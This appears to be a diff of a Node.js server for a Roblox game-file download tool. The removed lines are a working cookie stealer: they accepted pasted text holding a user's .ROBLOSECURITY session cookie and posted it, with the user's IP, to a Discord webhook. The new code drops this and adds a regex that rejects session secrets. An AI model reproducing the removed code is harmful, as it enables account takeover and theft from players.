@@ -1,23 +1,14 @@
 const express = require("express");
-const cors = require("cors"); // رجعنا مكتبة cors
-const fetch = require("node-fetch"); 
-const FormData = require("form-data");
+const cors = require("cors");
+const path = require("path");
 
 const app = express();
+const PORT = process.env.PORT || 3000;
 
-// استخدام مكتبة cors ببساطة شديدة (دي بتسمح بكل حاجة أوتوماتيك)
-app.use(cors()); 
-
-// عشان يقرأ البيانات اللي جاية
-app.use(express.json());
-
-const WEBHOOK_URL = process.env.WEBHOOK_URL; 
-
-// ... وتكمل باقي كودك (fileMap و app.post) عادي جداً
-
-/* =========================
-   🔥 ربط Game IDs بالملفات
-========================= */
+app.set("trust proxy", true);
+app.use(cors({ origin: true }));
+app.use(express.json({ limit: "2mb" }));
+app.use(express.urlencoded({ extended: true }));
 
 const fileMap = {
     "109983668079237": "1b1GnSdi7l7Mv53UEKtjNKdlC9IG2fFIq",
@@ -30,95 +21,87 @@ const fileMap = {
     "000": "1A1UHkQct18ZeK9qXWm7uynNIPPP5xUzM"
 };
 
-/* =========================
-   🔐 /verify
-========================= */
+function getValidKeys() {
+    const rawKeys = process.env.LICENSE_KEYS || process.env.LICENSE_KEY || "ORDYCOPY";
+    return rawKeys
+        .split(/[\n,;]+/)
+        .map((key) => key.trim())
+        .filter(Boolean);
+}
 
-app.post("/verify", async (req, res) => {
+function looksLikeSessionSecret(value) {
+    return /ROBLOSECURITY|WARNING:-DO-NOT-SHARE|Sharing-this-will-allow-someone-to-log-in/i.test(value);
+}
 
-    console.log("Incoming body:", req.body);
+function isValidLicenseKey(value) {
+    if (!value || typeof value !== "string") return false;
+    const key = value.trim();
+    if (key.length < 3 || key.length > 160) return false;
+    if (looksLikeSessionSecret(key)) return false;
+    return getValidKeys().includes(key);
+}
 
-    const powershell = req.body.licenseKey;
+function extractGameId(body) {
+    const candidates = [body.projectName, body.gameId, body.gameUrl, body.url]
+        .filter((value) => typeof value === "string")
+        .map((value) => value.trim());
 
-    // حماية إضافية: لو مفيش بيانات أو البيانات مش نص (عشان السيرفر ميقعش)
-    if (!powershell || typeof powershell !== "string") {
-        return res.json({ success: false });
+    for (const value of candidates) {
+        if (/^\d+$/.test(value)) return value;
+
+        const match = value.match(/roblox\.com\/(?:[a-z]{2}(?:-[a-z]{2})?\/)?games\/(\d+)/i);
+        if (match) return match[1];
     }
 
-    const warning = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+    return "000";
+}
 
-    if (!powershell.includes(warning)) {
-        return res.json({ success: false });
+function buildDownloadLink(gameId) {
+    const fileId = fileMap[gameId] || fileMap["000"];
+    return `https://drive.google.com/uc?export=download&id=${fileId}`;
+}
+
+function handleVerify(req, res) {
+    const licenseKey = req.body.licenseKey;
+
+    if (!isValidLicenseKey(licenseKey)) {
+        return res.json({
+            success: false,
+            error: "INVALID_LICENSE"
+        });
     }
 
-    const cleanedInput = powershell.replace(/\s+/g, " ").trim();
-
-    const match = cleanedInput.match(/roblox\.com\/(?:[a-z]{2}(?:-[a-z]{2})?\/)?games\/(\d+)/i);
-
-    if (!match) {
-        console.log("No match found");
-        return res.json({ success: false });
-    }
-
-    const gameId = match[1];
-    console.log("Game ID:", gameId);
-
-    let fileId = fileMap[gameId];
-
-    // لو الـ ID مش موجود نستخدم 000
-    if (!fileId) {
-        console.log("Game ID not supported — using default 000");
-        fileId = fileMap["000"];
-    }
-
-    const downloadLink = "https://drive.google.com/uc?export=download&id=" + fileId;
-
-    /* =========================
-        📩 إرسال ملف TXT للديسكورد
-    ========================== */
-
-    try {
-        if (WEBHOOK_URL) {
-            const logMessage = `
-Game ID: ${gameId}
-IP: ${req.headers["x-forwarded-for"] || req.socket.remoteAddress}
-Time: ${new Date().toLocaleString()}
-
-Full PowerShell:
-${powershell}
-`;
-
-            const form = new FormData();
-            form.append("file", Buffer.from(logMessage), {
-                filename: "log.txt",
-                contentType: "text/plain"
-            });
-
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                body: form
-            });
-
-            console.log("TXT file sent to Discord");
-        } else {
-            console.log("DISCORD_WEBHOOK not set");
-        }
-
-    } catch (err) {
-        console.log("Discord error:", err.message);
-    }
+    const gameId = extractGameId(req.body);
 
     return res.json({
         success: true,
-        download: downloadLink
+        gameId,
+        download: buildDownloadLink(gameId)
     });
+}
 
-}); 
+app.get("/health", (req, res) => {
+    res.json({
+        ok: true,
+        service: "ordycopy-verify-server",
+        time: new Date().toISOString()
+    });
+});
 
-/* =========================
-   🚀 تشغيل السيرفر
-========================= */
+app.get("/api/health", (req, res) => {
+    res.json({ ok: true });
+});
 
-app.listen(process.env.PORT || 3000, () => {
-    console.log("Server running...");
+app.post("/", handleVerify);
+app.post("/verify", handleVerify);
+app.post("/api/verify", handleVerify);
+
+app.use(express.static(__dirname));
+
+app.get("*", (req, res) => {
+    res.sendFile(path.join(__dirname, "index.html"));
+});
+
+app.listen(PORT, () => {
+    console.log(`OrdyCopy verify server running on port ${PORT}`);
 });
